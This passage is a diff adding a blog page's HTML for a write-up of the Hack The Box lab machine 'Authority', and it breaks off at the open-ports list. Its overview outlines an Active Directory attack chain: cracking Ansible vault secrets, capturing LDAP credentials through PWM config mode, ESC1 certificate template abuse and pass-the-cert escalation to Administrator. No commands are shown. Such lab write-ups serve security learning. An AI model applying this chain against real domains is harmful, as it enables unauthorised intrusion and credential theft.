@@ -1,0 +1,2056 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  
+  <title>HTB Authority &middot; Abraxas</title>
+    <meta name="title" content="HTB Authority &middot; Abraxas" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.017a29273e0d1e39f8792cba62098ea8e1c922fd373503ba94b73dcab44dea79.css"
+    integrity="sha256-AXopJz4NHjn4eSy6YgmOqOHJIv03NQO6lLc9yrRN6nk="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bb487ad6073790cb02c354ee8c5f8822c42c5513e10bf7a86bbe8f82118cd1fc.js"
+      integrity="sha256-u0h61gc3kMsCw1TujF&#43;IIsQsVRPhC/eoa76PghGM0fw="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/htb-authority/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+<link rel="manifest" href="/site.webmanifest" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/htb-authority/">
+  <meta property="og:site_name" content="Abraxas">
+  <meta property="og:title" content="HTB Authority">
+  <meta property="og:description" content="Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-12-10T03:33:35+05:30">
+    <meta property="article:modified_time" content="2023-12-10T03:33:35+05:30">
+    <meta property="article:tag" content="Htb-Medium">
+    <meta property="article:tag" content="SMB">
+    <meta property="article:tag" content="Nxc">
+    <meta property="article:tag" content="Ldap">
+    <meta property="article:tag" content="PWM">
+    <meta property="article:tag" content="Ansible-Vault">
+    <meta property="og:image" content="//localhost:1313/blog/htb-authority/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/blog/htb-authority/cover.png">
+  <meta name="twitter:title" content="HTB Authority">
+  <meta name="twitter:description" content="Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "HTB Authority",
+    "headline": "HTB Authority",
+    
+    "abstract": "Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/htb-authority\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Abraxas"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-12-10T03:33:35\u002b05:30",
+    "datePublished": "2023-12-10T03:33:35\u002b05:30",
+    
+    "dateModified": "2023-12-10T03:33:35\u002b05:30",
+    
+    "keywords": ["htb-medium","SMB","nxc","ldap","PWM","ansible-vault","AD","ADCS","ESC1","certipy","PassTheCert"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "5186"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="Abraxas" />
+  
+    
+      <link href="mailto:abr4xa5@proton.me" rel="me" />
+    
+      <link href="https://abraxas.pages.dev/" rel="me" />
+    
+      <link href="https://discordapp.com/users/703653879375724657" rel="me" />
+    
+      <link href="https://github.com/AbraXa5" rel="me" />
+    
+      <link href="https://infosec.exchange/@Abraxas" rel="me" />
+    
+      <link href="https://twitter.com/Abr4Xa5_" rel="me" />
+    
+      <link href="/blog/index.xml" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Abraxas</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/blog/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about-me/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About Me</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    <button
+                      id="appearance-switcher-1"
+                      type="button"
+                      aria-label="appearance switcher"
+                    >
+                      <span
+                        class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                        title="Switch to dark appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                      <span
+                        class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                        title="Switch to light appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                    </button>
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/blog/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about-me/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About Me</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                <button
+                  id="appearance-switcher-2"
+                  type="button"
+                  aria-label="appearance switcher"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                    title="Switch to dark appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                  <span
+                    class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                    title="Switch to light appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                </button>
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Abraxas</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/htb-authority/"
+      >HTB Authority</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Authority
+      </h1>
+      
+        <div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-12-10 03:33:35 &#43;0530 IST">10 December 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">25 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/AbraXa5/personal-blog/tree/main/content/blog/htb-authority/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/htb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTB</a
+            >
+          
+            <a
+              href="/categories/windows/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Windows</a
+            >
+          
+            <a
+              href="/categories/active-directory/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Active-Directory</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/htb-medium/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Htb-Medium</a
+            >
+          
+            <a
+              href="/tags/smb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >SMB</a
+            >
+          
+            <a
+              href="/tags/nxc/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Nxc</a
+            >
+          
+            <a
+              href="/tags/ldap/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Ldap</a
+            >
+          
+            <a
+              href="/tags/pwm/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >PWM</a
+            >
+          
+            <a
+              href="/tags/ansible-vault/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Ansible-Vault</a
+            >
+          
+            <a
+              href="/tags/ad/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >AD</a
+            >
+          
+            <a
+              href="/tags/adcs/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >ADCS</a
+            >
+          
+            <a
+              href="/tags/esc1/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >ESC1</a
+            >
+          
+            <a
+              href="/tags/certipy/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Certipy</a
+            >
+          
+            <a
+              href="/tags/passthecert/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >PassTheCert</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 -mt-4 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="/blog/htb-authority/cover_hu9400026c8f75d97843ddc4aa7b554834_73578_300x300_resize_q75_h2_box_3.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="300"
+        height="300"
+        class="mb-6 -mt-4 rounded-md"
+        
+        
+        
+          src="/blog/htb-authority/cover.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 print:hidden lg:sticky lg:top-10">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#port-53---dns">port 53 - DNS</a></li>
+        <li><a href="#port-445---smb">port 445 - SMB</a></li>
+        <li><a href="#port-8443---https">port 8443 - HTTPS</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#capturing-ldap-credentials">Capturing LDAP credentials</a></li>
+        <li><a href="#shell-as-svc_ldap">Shell as svc_ldap</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumerating-active-directory">Enumerating Active Directory</a>
+      <ul>
+        <li><a href="#enum-with-adpeas">Enum with adPEAS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#ad-cs-certificate-abuse">AD CS Certificate abuse</a></li>
+        <li><a href="#exploit-path">Exploit Path</a></li>
+        <li><a href="#passthecert-attack">PassTheCert Attack</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><hr>
+<blockquote>
+<p>Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used the &ldquo;pass-the-cert&rdquo; attack to gain access as Administrator.</p>
+</blockquote>
+<hr>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="open-ports" class="relative group">Open Ports <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#open-ports" aria-label="Anchor">#</a></span></h3><p>Found a bunch of open ports using nmap</p>
+<ul>
+<li>port 53 → DNS</li>
+<li>port 80 → IIS Web server</li>
+<li>port 88 → Kerberos</li>
+<li>port 135 → MS RPC</li>
+<li>port 139, 445 → SMB</li>
